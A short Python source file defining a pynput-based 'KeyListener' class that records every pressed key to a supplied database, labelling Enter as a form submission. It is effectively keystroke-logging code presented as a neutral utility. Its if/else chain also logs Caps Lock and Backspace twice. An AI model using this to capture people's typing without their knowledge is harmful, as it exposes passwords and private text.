from pynput import keyboard

'''
    A key listener with customizable listening properties through the on_press and on_release callback functions.
'''


class KeyListener():

    '''
        Constructs an instance of this class, taking in a database as a field.
    '''

    def __init__(self, databaseConnection):
        self.dataBase = databaseConnection
        self.listener = keyboard.Listener(
            on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    '''
        Defines the behavior when a key is pressed.
    '''

    def on_press(self, key):
        if (key == keyboard.Key.caps_lock):
            self.dataBase.write("Caps")
        if (key == keyboard.Key.backspace):
            self.dataBase.write("Backspace")
        if (key == keyboard.Key.enter):
            self.dataBase.write("User submitted a form.")
        else:

            self.dataBase.write(key)

    '''
        Defines the behavior when a key is released. Note: When a key is typed, it is both pressed and released. 
        Theoretically, you can not use this function at all and just use on_press. But if you want more fine tuned control, you can 
        make edits here too.
    '''

    def on_release(self, key):
        if key == keyboard.Key.esc:  # Stop listener when the Esc key is pressed
            return False


    '''
        Stops the listener from listening.
    '''

    def stop_listening(self):
        keyboard.Listener.stop(self.listener)